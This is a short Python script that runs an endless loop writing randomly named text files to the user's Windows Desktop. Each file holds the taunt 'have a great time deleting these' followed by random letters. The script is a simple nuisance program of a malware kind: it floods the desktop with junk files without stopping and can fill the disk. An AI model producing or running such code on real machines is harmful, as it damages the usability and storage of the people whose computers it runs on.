import os
import random
import string
a = "".join(random.choices(string.ascii_lowercase,k=100))
name=string.ascii_lowercase+string.ascii_uppercase+string.digits
def replicating ():
    username = os.getenv('userprofile')
    filename = "".join(random.choices(name,k=random.randint(0,10)))
    username = fr'{username}\Desktop\{filename}.txt'

    with open(username, 'w') as file1:
        file1.write('have a great time deleting these')
        file1.write(a)

while True:
    replicating()